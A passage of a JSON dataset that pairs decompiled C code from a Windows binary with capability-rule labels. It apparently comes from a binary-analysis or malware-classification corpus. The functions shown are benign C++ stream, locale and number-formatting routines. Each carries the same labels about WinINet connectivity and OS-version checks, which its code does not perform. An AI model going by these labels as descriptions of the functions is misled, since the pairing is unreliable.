        "decompiled_code": "\nint64_t * fcn.1400b4ba0(int64_t arg1, int64_t *arg2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uchar uVar10;\n    int64_t iVar11;\n    int64_t *piVar12;\n    int64_t *piVar13;\n    char *pcVar14;\n    char *pcVar15;\n    uint32_t uVar16;\n    uint64_t uVar17;\n    bool bVar18;\n    uchar auStack88 [8];\n    \n    piVar13 = *(arg1 + 0xe8);\n    *(arg1 + 0xe8) = arg2;\n    *(arg1 + 0x20) = arg2 == NULL;\n    if ((arg2 == NULL & *(arg1 + 0x1c)) == 0) {\n        return piVar13;\n    }\n    pcVar14 = \"basic_ios::clear\";\n    fcn.1400bd8d0(\"basic_ios::clear\");\n    if (pcVar14 == arg2) {\n        return pcVar14;\n    }\n    piVar13 = pcVar14 + 0x40;\n    if (*(arg2 + 0x18) < 9) {\ncode_r0x0001400b4c0f:\n        iVar11 = arg2[5];\n    }\n    else {\n        piVar13 = fcn.1400bc6e0(*(arg2 + 0x18) << 4);\n        iVar11 = *(arg2 + 0x18) + -1;\n        piVar12 = piVar13;\n        if (iVar11 < 0) goto code_r0x0001400b4c0f;\n        do {\n            *piVar12 = 0;\n            *(piVar12 + 1) = 0;\n            bVar18 = iVar11 != 0;\n            iVar11 = iVar11 + -1;\n            piVar12 = piVar12 + 2;\n        } while (bVar18);\n        iVar11 = arg2[5];\n    }\n    if (iVar11 != 0) {\n        if (**0x14010fc90 == 0) {\n            *(iVar11 + 0x14) = *(iVar11 + 0x14) + 1;\n        }\n        else {\n            LOCK();\n            *(iVar11 + 0x14) = *(iVar11 + 0x14) + 1;\n        }\n    }\n    uVar16 = 0;\n    fcn.1400b2950(pcVar14, 0);\n    if (*(pcVar14 + 200) != pcVar14 + 0x40) {\n        if (*(pcVar14 + 200) != NULL) {\n            fcn.1400bc6b0();\n        }\n        *(pcVar14 + 200) = 0;\n    }\n    pcVar15 = pcVar14;\n    fcn.1400b29f0(pcVar14);\n    iVar2 = *(arg2 + 0x18);\n    *(pcVar14 + 0x28) = iVar11;\n    iVar11 = 0;\n    if (0 < iVar2) {\n        do {\n            iVar5 = arg2[0x19];\n            pcVar15 = *(iVar5 + iVar11);\n            *(piVar13 + iVar11) = pcVar15;\n            uVar16 = *(iVar5 + 8 + iVar11);\n            *(piVar13 + iVar11 + 8) = uVar16;\n            iVar11 = iVar11 + 0x10;\n        } while (iVar11 != iVar2 * 0x10);\n    }\n    uVar3 = *(arg2 + 3);\n    uVar6 = *(arg2 + 1);\n    uVar7 = *(arg2 + 0xc);\n    uVar8 = *(arg2 + 2);\n    uVar9 = *(arg2 + 0x14);\n    *(pcVar14 + 200) = piVar13;\n    cVar1 = *(arg2 + 0xe1);\n    *(pcVar14 + 0xc0) = iVar2;\n    *(pcVar14 + 0x18) = uVar3;\n    iVar11 = arg2[0x1b];\n    *(pcVar14 + 8) = uVar6;\n    *(pcVar14 + 0xc) = uVar7;\n    *(pcVar14 + 0x10) = uVar8;\n    *(pcVar14 + 0x14) = uVar9;\n    *(pcVar14 + 0xd8) = iVar11;\n    if (cVar1 == '\\0') {\n        piVar13 = arg2[0x1e];\n        if (piVar13 == NULL) goto code_r0x0001400b4eb6;\n        if (*(piVar13 + 7) == '\\0') {\n            uVar10 = 0x20;\n            pcVar15 = piVar13;\n            fcn.14002b2c0(piVar13);\n            uVar16 = 0x4002bab0;\n            if (*(*piVar13 + 0x30) != 0x14002bab0) {\n                uVar16 = 0x20;\n                uVar10 = (**(*piVar13 + 0x30))();\n                pcVar15 = piVar13;\n            }\n        }\n        else {\n            uVar10 = *(piVar13 + 0x59);\n        }\n        *(arg2 + 0x1c) = uVar10;\n        *(arg2 + 0xe1) = 1;\n        cVar1 = *(pcVar14 + 0xe1);\n    }\n    else {\n        cVar1 = *(pcVar14 + 0xe1);\n        uVar10 = *(arg2 + 0x1c);\n    }\n    if (cVar1 == '\\0') {\n        piVar13 = *(pcVar14 + 0xf0);\n        if (piVar13 == NULL) goto code_r0x0001400b4eb6;\n        if (*(piVar13 + 7) == '\\0') {\n            fcn.14002b2c0(piVar13);\n            if (*(*piVar13 + 0x30) != 0x14002bab0) {\n                (**(*piVar13 + 0x30))(piVar13, 0x20);\n            }\n        }\n        *(pcVar14 + 0xe1) = 1;\n    }\n    *(pcVar14 + 0xe0) = uVar10;\n    fcn.1400a59d0(auStack88, arg2 + 0x1a);\n    fcn.1400a5b40(pcVar14 + 0xd0, auStack88);\n    fcn.1400a5ae0(auStack88);\n    fcn.1400b47a0(pcVar14, pcVar14 + 0xd0);\n    fcn.1400b2950(pcVar14, 2);\n    uVar4 = *(arg2 + 0x1c);\n    uVar16 = *(pcVar14 + 0x20);\n    *(pcVar14 + 0x1c) = uVar4;\n    if (*(pcVar14 + 0xe8) == 0) {\n        uVar16 = uVar16 | 1;\n        *(pcVar14 + 0x20) = uVar16;\n    }\n    if ((uVar4 & uVar16) == 0) {\n        return pcVar14;\n    }\n    pcVar15 = \"basic_ios::clear\";\n    fcn.1400bd8d0(\"basic_ios::clear\");\ncode_r0x0001400b4eb6:\n    piVar13 = fcn.1400bd1f0();\n    uVar16 = uVar16 | *(pcVar15 + 0x20);\n    if (*(pcVar15 + 0xe8) == 0) {\n        uVar16 = uVar16 | 1;\n    }\n    *(pcVar15 + 0x20) = uVar16;\n    uVar16 = uVar16 & *(pcVar15 + 0x1c);\n    uVar17 = uVar16;\n    if (uVar16 == 0) {\n        return piVar13;\n    }\n    pcVar14 = \"basic_ios::clear\";\n    piVar13 = fcn.1400bd8d0(\"basic_ios::clear\");\n    *(pcVar14 + 0xe8) = uVar17;\n    return piVar13;\n}\n",
        "token_count": 1913
    },
    "1400b557": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar * fcn.1400b5570(int64_t arg1, char *arg2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    ulong uVar7;\n    ulong uVar8;\n    ushort uVar9;\n    int64_t iVar10;\n    ulong *puVar11;\n    ulong *puVar12;\n    char *pcVar13;\n    char *pcVar14;\n    uint32_t uVar15;\n    uint64_t uVar16;\n    bool bVar17;\n    uchar auStack88 [8];\n    \n    pcVar13 = *(arg1 + 0xe8);\n    *(arg1 + 0xe8) = arg2;\n    *(arg1 + 0x20) = arg2 == NULL;\n    if ((arg2 == NULL & *(arg1 + 0x1c)) == 0) {\n        return pcVar13;\n    }\n    pcVar13 = \"basic_ios::clear\";\n    fcn.1400bd8d0(\"basic_ios::clear\");\n    if (pcVar13 == arg2) {\n        return pcVar13;\n    }\n    puVar11 = pcVar13 + 0x40;\n    if (*(arg2 + 0xc0) < 9) {\ncode_r0x0001400b55df:\n        iVar10 = *(arg2 + 0x28);\n    }\n    else {\n        puVar11 = fcn.1400bc6e0(*(arg2 + 0xc0) << 4);\n        iVar10 = *(arg2 + 0xc0) + -1;\n        puVar12 = puVar11;\n        if (iVar10 < 0) goto code_r0x0001400b55df;\n        do {\n            *puVar12 = 0;\n            *(puVar12 + 1) = 0;\n            bVar17 = iVar10 != 0;\n            iVar10 = iVar10 + -1;\n            puVar12 = puVar12 + 2;\n        } while (bVar17);\n        iVar10 = *(arg2 + 0x28);\n    }\n    if (iVar10 != 0) {\n        if (**0x14010fc90 == 0) {\n            *(iVar10 + 0x14) = *(iVar10 + 0x14) + 1;\n        }\n        else {\n            LOCK();\n            *(iVar10 + 0x14) = *(iVar10 + 0x14) + 1;\n        }\n    }\n    uVar15 = 0;\n    fcn.1400b2950(pcVar13, 0);\n    if (*(pcVar13 + 200) != pcVar13 + 0x40) {\n        if (*(pcVar13 + 200) != NULL) {\n            fcn.1400bc6b0();\n        }\n        *(pcVar13 + 200) = 0;\n    }\n    fcn.1400b29f0(pcVar13);\n    iVar2 = *(arg2 + 0xc0);\n    *(pcVar13 + 0x28) = iVar10;\n    iVar10 = 0;\n    if (0 < iVar2) {\n        do {\n            iVar5 = *(arg2 + 200);\n            *(puVar11 + iVar10) = *(iVar5 + iVar10);\n            uVar15 = *(iVar5 + 8 + iVar10);\n            *(puVar11 + iVar10 + 8) = uVar15;\n            iVar10 = iVar10 + 0x10;\n        } while (iVar10 != iVar2 * 0x10);\n    }\n    uVar3 = *(arg2 + 0x18);\n    uVar7 = *(arg2 + 8);\n    uVar8 = *(arg2 + 0x10);\n    *(pcVar13 + 200) = puVar11;\n    cVar1 = arg2[0xe2];\n    *(pcVar13 + 0xc0) = iVar2;\n    *(pcVar13 + 0x18) = uVar3;\n    uVar6 = *(arg2 + 0xd8);\n    *(pcVar13 + 8) = uVar7;\n    *(pcVar13 + 0x10) = uVar8;\n    *(pcVar13 + 0xd8) = uVar6;\n    if (cVar1 == '\\0') {\n        pcVar14 = *(arg2 + 0xf0);\n        if (pcVar14 == NULL) goto code_r0x0001400b5816;\n        uVar15 = 0x20;\n        uVar9 = (**(*pcVar14 + 0x50))(uVar7);\n        arg2[0xe2] = '\\x01';\n        cVar1 = pcVar13[0xe2];\n        *(arg2 + 0xe0) = uVar9;\n    }\n    else {\n        cVar1 = pcVar13[0xe2];\n        uVar9 = *(arg2 + 0xe0);\n    }\n    if (cVar1 == '\\0') {\n        pcVar14 = *(pcVar13 + 0xf0);\n        if (pcVar14 == NULL) goto code_r0x0001400b5816;\n        (**(*pcVar14 + 0x50))(pcVar14, 0x20);\n        pcVar13[0xe2] = '\\x01';\n    }\n    *(pcVar13 + 0xe0) = uVar9;\n    fcn.1400a59d0(auStack88, arg2 + 0xd0);\n    fcn.1400a5b40(pcVar13 + 0xd0, auStack88);\n    fcn.1400a5ae0(auStack88);\n    fcn.1400b51a0(pcVar13, pcVar13 + 0xd0);\n    fcn.1400b2950(pcVar13, 2);\n    uVar4 = *(arg2 + 0x1c);\n    uVar15 = *(pcVar13 + 0x20);\n    *(pcVar13 + 0x1c) = uVar4;\n    if (*(pcVar13 + 0xe8) == 0) {\n        uVar15 = uVar15 | 1;\n        *(pcVar13 + 0x20) = uVar15;\n    }\n    if ((uVar4 & uVar15) == 0) {\n        return pcVar13;\n    }\n    pcVar14 = \"basic_ios::clear\";\n    fcn.1400bd8d0(\"basic_ios::clear\");\ncode_r0x0001400b5816:\n    pcVar13 = fcn.1400bd1f0();\n    uVar15 = uVar15 | *(pcVar14 + 0x20);\n    if (*(pcVar14 + 0xe8) == 0) {\n        uVar15 = uVar15 | 1;\n    }\n    *(pcVar14 + 0x20) = uVar15;\n    uVar15 = uVar15 & *(pcVar14 + 0x1c);\n    uVar16 = uVar15;\n    if (uVar15 == 0) {\n        return pcVar13;\n    }\n    pcVar14 = \"basic_ios::clear\";\n    pcVar13 = fcn.1400bd8d0(\"basic_ios::clear\");\n    *(pcVar14 + 0xe8) = uVar16;\n    return pcVar13;\n}\n",
        "token_count": 1650
    },
    "1400b5d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.1400b5d80(uchar *arg1, ulong arg2, int64_t arg3, ulong arg4)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    uchar *puVar3;\n    char in_stack_00000028;\n    \n    puVar3 = arg1;\n    if (in_stack_00000028 == '\\0') {\n        if ((arg4 & 0x4a) == 0x40) {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = arg2 & 7;\n                arg2._0_4_ = arg2 >> 3;\n                *puVar3 = *(arg3 + 4 + uVar2);\n            } while (arg2 != 0);\n        }\n        else {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = arg2 & 0xf;\n                arg2._0_4_ = arg2 >> 4;\n                *puVar3 = *(arg3 + uVar2 + (-((arg4 & 0x4000) == 0) & 0xfffffff0) + 0x14);\n            } while (arg2 != 0);\n        }\n    }\n    else {\n        do {\n            puVar3 = puVar3 + -1;\n            *puVar3 = *(arg3 + arg2 % 10 + 4);\n            bVar1 = 9 < arg2;\n            arg2._0_4_ = arg2 / 10;\n        } while (bVar1);\n    }\n    return arg1 - puVar3;\n}\n",
        "token_count": 360
    },
    "1400b5e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.1400b5e40(uchar *arg1, uint64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    uchar *puVar3;\n    char in_stack_00000028;\n    \n    puVar3 = arg1;\n    if (in_stack_00000028 == '\\0') {\n        if ((arg4 & 0x4a) == 0x40) {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = arg2;\n                arg2 = arg2 >> 3;\n                *puVar3 = *(arg3 + 4 + (uVar2 & 7));\n            } while (arg2 != 0);\n        }\n        else {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = arg2;\n                arg2 = arg2 >> 4;\n                *puVar3 = *(arg3 + 0x14 + (-((arg4 & 0x4000) == 0) & 0xfffffffffffffff0) + (uVar2 & 0xf));\n            } while (arg2 != 0);\n        }\n    }\n    else {\n        do {\n            puVar3 = puVar3 + -1;\n            *puVar3 = *(arg3 + 4 + arg2 % 10);\n            bVar1 = 9 < arg2;\n            arg2 = arg2 / 10;\n        } while (bVar1);\n    }\n    return arg1 - puVar3;\n}\n",
        "token_count": 349
    },
    "1400b5f1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.1400b5f10(ushort *arg1, ulong arg2, int64_t arg3, ulong arg4)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    ushort *puVar3;\n    char in_stack_00000028;\n    \n    puVar3 = arg1;\n    if (in_stack_00000028 == '\\0') {\n        if ((arg4 & 0x4a) == 0x40) {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = arg2 & 7;\n                arg2._0_4_ = arg2 >> 3;\n                *puVar3 = *(arg3 + 8 + uVar2 * 2);\n            } while (arg2 != 0);\n        }\n        else {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = arg2 & 0xf;\n                arg2._0_4_ = arg2 >> 4;\n                *puVar3 = *(arg3 + (uVar2 + (-((arg4 & 0x4000) == 0) & 0xfffffff0) + 0x14) * 2);\n            } while (arg2 != 0);\n        }\n    }\n    else {\n        do {\n            puVar3 = puVar3 + -1;\n            *puVar3 = *(arg3 + (arg2 % 10 + 4) * 2);\n            bVar1 = 9 < arg2;\n            arg2._0_4_ = arg2 / 10;\n        } while (bVar1);\n    }\n    return arg1 - puVar3 >> 1;\n}\n",
        "token_count": 376
    },
    "1400b5fe": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.1400b5fe0(ushort *arg1, uint64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    ushort *puVar3;\n    char in_stack_00000028;\n    \n    puVar3 = arg1;\n    if (in_stack_00000028 == '\\0') {\n        if ((arg4 & 0x4a) == 0x40) {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = arg2;\n                arg2 = arg2 >> 3;\n                *puVar3 = *(arg3 + 8 + (uVar2 & 7) * 2);\n            } while (arg2 != 0);\n        }\n        else {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = arg2;\n                arg2 = arg2 >> 4;\n                *puVar3 = *(arg3 + ((uVar2 & 0xf) + (-((arg4 & 0x4000) == 0) & 0xfffffffffffffff0) + 0x14) * 2);\n            } while (arg2 != 0);\n        }\n    }\n    else {\n        do {\n            puVar3 = puVar3 + -1;\n            *puVar3 = *(arg3 + 8 + (arg2 % 10) * 2);\n            bVar1 = 9 < arg2;\n            arg2 = arg2 / 10;\n        } while (bVar1);\n    }\n    return arg1 - puVar3 >> 1;\n}\n",
        "token_count": 366
    },
    "1400b641": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400b6410(char *arg1, double *arg2, uint *arg3)\n\n{\n    int64_t iVar1;\n    double dVar2;\n    char *apcStack48 [2];\n    \n    iVar1 = fcn.140081270();\n    if (iVar1 != 0) {\n        dVar2 = fcn.1400155b0(arg1, apcStack48);\n        *arg2 = dVar2;\n        if ((apcStack48[0] == arg1) || (*apcStack48[0] != '\\0')) {\n            *arg2 = 0.0;\n            *arg3 = 4;\n        }\n        else if ((dVar2 < *0x14010e0e8) || (*0x14010e0e0 < dVar2)) {\n            *arg2 = *0x14010e0e0 & -(0.0 < dVar2) | ~-(0.0 < dVar2) & *0x14010e0e8;\n            *arg3 = 4;\n        }\n        sub.msvcrt.dll_setlocale(0, iVar1);\n        fcn.1400bc6b0(iVar1);\n        return;\n    }\n    *arg3 = 4;\n    return;\n}\n",
        "token_count": 284
    },
    "1400b64e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400b64e0(char *arg1, float10 *arg2, uint *arg3)\n\n{\n    int64_t iVar1;\n    float10 fVar2;\n    float10 afStack72 [2];\n    char *apcStack48 [2];\n    \n    iVar1 = fcn.140081270();\n    if (iVar1 != 0) {\n        fcn.140015760(afStack72, arg1, apcStack48);\n        *arg2 = afStack72[0];\n        if ((apcStack48[0] == arg1) || (*apcStack48[0] != '\\0')) {\n            *arg2 = 0;\n            *arg3 = 4;\n        }\n        else if ((afStack72[0] < *0x14010e100) || (*0x14010e0f0 < afStack72[0])) {\n            fVar2 = *0x14010e100;\n            if (0 < afStack72[0]) {\n                fVar2 = *0x14010e0f0;\n            }\n            *arg2 = fVar2;\n            *arg3 = 4;\n        }\n        sub.msvcrt.dll_setlocale(0, iVar1);\n        fcn.1400bc6b0(iVar1);\n        return;\n    }\n    *arg3 = 4;\n    return;\n}\n",
        "token_count": 303
    },
    "1400b65c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400b65c0(char *arg1, float *arg2, uint *arg3)\n\n{\n    int64_t iVar1;\n    float fVar2;\n    char *apcStack48 [2];\n    \n    iVar1 = fcn.140081270();\n    if (iVar1 != 0) {\n        fVar2 = fcn.1400156c0(arg1, apcStack48);\n        *arg2 = fVar2;\n        if ((apcStack48[0] == arg1) || (*apcStack48[0] != '\\0')) {\n            *arg2 = 0.0;\n            *arg3 = 4;\n        }\n        else if ((fVar2 < *0x14010e0dc) || (*0x14010e0d8 < fVar2)) {\n            *arg2 = *0x14010e0d8 & -(0.0 < fVar2) | ~-(0.0 < fVar2) & *0x14010e0dc;\n            *arg3 = 4;\n        }\n        sub.msvcrt.dll_setlocale(0, iVar1);\n        fcn.1400bc6b0(iVar1);\n        return;\n    }\n    *arg3 = 4;\n    return;\n}\n",
        "token_count": 283
    },
    "1400b729": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400b7290(int64_t *arg1, uchar *arg2, int64_t arg3)\n\n{\n    uint8_t uVar1;\n    int64_t *piVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    uint8_t *puVar7;\n    uint64_t uVar8;\n    uint32_t uVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    uchar *puVar12;\n    int64_t iVar13;\n    int64_t iVar14;\n    int64_t iVar15;\n    int64_t iVar16;\n    int64_t iVar17;\n    uint32_t uStack92;\n    uint8_t uStack81;\n    uchar auStack80 [16];\n    \n    fcn.140078330(&uStack81, arg1, 0);\n    uVar9 = uStack92 & 0xffffff00;\n    uStack92 = uVar9 | uStack81;\n    iVar6 = *arg1;\n    if (uStack81 == 0) {\n        uVar9 = 4;\n        goto code_r0x0001400b742d;\n    }\n    iVar15 = *(arg1 + *(iVar6 + -0x18) + 0x10);\n    if ((iVar15 < 1) || (arg3 <= iVar15)) {\n        iVar15 = arg3;\n    }\n    fcn.1400a59d0(auStack80, arg1 + *(iVar6 + -0x18) + 0xd0);\n    iVar6 = fcn.1400b97f0(auStack80);\n    fcn.1400a5ae0(auStack80);\n    piVar2 = *(arg1 + *(*arg1 + -0x18) + 0xe8);\n    if (piVar2[2] < piVar2[3]) {\n        uVar8 = *piVar2[2];\n        if (0 < iVar15 + -1) {\ncode_r0x0001400b7341:\n            iVar16 = iVar15 + -1;\n            iVar11 = 0;\ncode_r0x0001400b7348:\n            iVar13 = *(iVar6 + 0x30);\n            puVar12 = arg2;\n            uVar3 = uVar9;\n            if ((*(iVar13 + (uVar8 & 0xff) * 2) & 0x20) == 0) {\n                do {\n                    iVar17 = piVar2[2];\n                    iVar10 = (iVar15 - iVar11) + -1;\n                    iVar14 = piVar2[3] - iVar17;\n                    if (iVar14 < iVar10) {\n                        iVar10 = iVar14;\n                    }\n                    if (1 < iVar10) {\n                        puVar7 = iVar17 + 1;\n                        if (puVar7 < iVar10 + iVar17) goto code_r0x0001400b73a1;\n                        iVar17 = 1;\n                        goto code_r0x0001400b74c0;\n                    }\n                    *arg2 = uVar8;\n                    puVar12 = arg2 + 1;\n                    iVar11 = iVar11 + 1;\n                    if (piVar2[2] < piVar2[3]) {\n                        puVar7 = piVar2[2] + 1;\n                        piVar2[2] = puVar7;\n                        if (piVar2[3] <= puVar7) goto code_r0x0001400b7568;\n                    }\n                    else {\n                        iVar5 = (**(*piVar2 + 0x50))(piVar2);\n                        if (iVar5 == -1) {\n                            if (iVar16 <= iVar11) {\n                                arg2[1] = 0;\n                                *(arg1 + *(*arg1 + -0x18) + 0x10) = 0;\n                                return;\n                            }\n                            arg2[1] = 0;\n                            iVar6 = *arg1;\n                            *(arg1 + *(iVar6 + -0x18) + 0x10) = 0;\n                            uVar9 = (-(iVar11 == 0) & 4) + 2;\n                            goto code_r0x0001400b742d;\n                        }\n                        puVar7 = piVar2[2];\n                        if (piVar2[3] <= puVar7) goto code_r0x0001400b7568;\n                    }\n                    uVar1 = *puVar7;\n                    uVar8 = uVar1;\n                    uVar4 = uVar1;\n                    if (iVar16 <= iVar11) goto code_r0x0001400b73dd;\n                    iVar13 = *(iVar6 + 0x30);\n                    arg2 = puVar12;\n                    if ((*(iVar13 + uVar1 * 2) & 0x20) != 0) break;\n                } while( true );\n            }\n            goto code_r0x0001400b750e;\n        }\ncode_r0x0001400b75e3:\n        uVar9 = 4;\n    }\n    else {\n        uVar8 = (**(*piVar2 + 0x48))(piVar2);\n        if (iVar15 + -1 < 1) goto code_r0x0001400b75e3;\n        if (uVar8 != -1) goto code_r0x0001400b7341;\n        uVar9 = 6;\n    }\n    *arg2 = 0;\n    iVar6 = *arg1;\n    *(arg1 + *(iVar6 + -0x18) + 0x10) = 0;\ncode_r0x0001400b742d:\n    iVar6 = *(iVar6 + -0x18) + arg1;\n    fcn.1400b4ab0(iVar6, uVar9 | *(iVar6 + 0x20));\n    return;\n    while (puVar7 = puVar7 + 1,  iVar10 + iVar17 != puVar7) {\ncode_r0x0001400b73a1:\n        if ((*(iVar13 + *puVar7 * 2) & 0x20) != 0) break;\n    }\n    iVar17 = puVar7 - iVar17;\n    if (iVar17 == 0) {\n        piVar2[2] = puVar7;\n        if (puVar7 < piVar2[3]) goto code_r0x0001400b73d1;\n    }\n    else {\ncode_r0x0001400b74c0:\n        iVar11 = iVar11 + iVar17;\n        sub.msvcrt.dll_memcpy(arg2);\n        puVar7 = piVar2[2] + iVar17;\n        arg2 = arg2 + iVar17;\n        piVar2[2] = puVar7;\n        if (puVar7 < piVar2[3]) {\ncode_r0x0001400b73d1:\n            uVar8 = *puVar7;\n            uVar4 = *puVar7;\n            puVar12 = arg2;\n            if (iVar16 <= iVar11) goto code_r0x0001400b73dd;\n            goto code_r0x0001400b7348;\n        }\n    }\n    uVar8 = (**(*piVar2 + 0x48))(piVar2);\n    puVar12 = arg2;\ncode_r0x0001400b74fc:\n    uVar4 = uVar8;\n    if (iVar16 <= iVar11) goto code_r0x0001400b73dd;\n    arg2 = puVar12;\n    uVar3 = uStack92;\n    if (uVar4 == 0xffffffff) goto code_r0x0001400b750e;\n    goto code_r0x0001400b7348;\ncode_r0x0001400b7568:\n    uVar8 = (**(*piVar2 + 0x48))(piVar2);\n    goto code_r0x0001400b74fc;\ncode_r0x0001400b73dd:\n    uStack92 = uVar9 | uVar4 == 0xffffffff;\n    uVar3 = uStack92;\ncode_r0x0001400b750e:\n    uStack92 = uVar3;\n    *puVar12 = 0;\n    uVar9 = iVar11 < iVar16 & uStack92;\n    iVar6 = *arg1;\n    *(arg1 + *(iVar6 + -0x18) + 0x10) = 0;\n    if (iVar11 == 0) {\n        uVar9 = uVar9 * 2 | 4;\n    }\n    else {\n        if (uVar9 == 0) {\n            return;\n        }\n        uVar9 = 2;\n    }\n    goto code_r0x0001400b742d;\n}\n",
        "token_count": 1940
    },
    "1400b771": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.1400b7710(int64_t *arg1, int64_t *arg2, uchar *arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint8_t *puVar4;\n    int64_t iVar5;\n    uint8_t *puVar6;\n    int64_t iVar7;\n    \n    puVar6 = arg1[3];\n    puVar4 = arg1[2];\n    *arg3 = 1;\n    if (puVar4 < puVar6) {\n        uVar1 = *puVar4;\n    }\n    else {\n        uVar1 = (**(*arg1 + 0x48))();\n        if (uVar1 == 0xffffffff) {\n            return 0;\n        }\n        puVar6 = arg1[3];\n        puVar4 = arg1[2];\n    }\n    iVar7 = 0;\n    do {\n        iVar5 = puVar6 - puVar4;\n        if (iVar5 < 2) {\n            if (arg2[5] < arg2[6]) {\n                *arg2[5] = uVar1;\n                arg2[5] = arg2[5] + 1;\n            }\n            else {\n                iVar2 = (**(*arg2 + 0x68))(arg2, uVar1 & 0xff);\n                if (iVar2 == -1) goto code_r0x0001400b77c8;\n            }\n            puVar6 = arg1[3];\n            iVar7 = iVar7 + 1;\n            if (arg1[2] < puVar6) {\n                puVar4 = arg1[2] + 1;\n                arg1[2] = puVar4;\n            }\n            else {\n                iVar2 = (**(*arg1 + 0x50))(arg1);\n                if (iVar2 == -1) {\n                    return iVar7;\n                }\n                puVar4 = arg1[2];\n                puVar6 = arg1[3];\n            }\n            if (puVar6 <= puVar4) goto code_r0x0001400b7759;\n            uVar1 = *puVar4;\n        }\n        else {\n            iVar3 = (**(*arg2 + 0x60))(arg2, puVar4, iVar5);\n            arg1[2] = arg1[2] + iVar3;\n            iVar7 = iVar7 + iVar3;\n            if (iVar3 < iVar5) {\ncode_r0x0001400b77c8:\n                *arg3 = 0;\n                return iVar7;\n            }\ncode_r0x0001400b7759:\n            uVar1 = (**(*arg1 + 0x48))(arg1);\n            if (uVar1 == 0xffffffff) {\n                return iVar7;\n            }\n            puVar6 = arg1[3];\n        }\n        puVar4 = arg1[2];\n    } while( true );\n}\n",
        "token_count": 650
    },
    "1400b7a5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
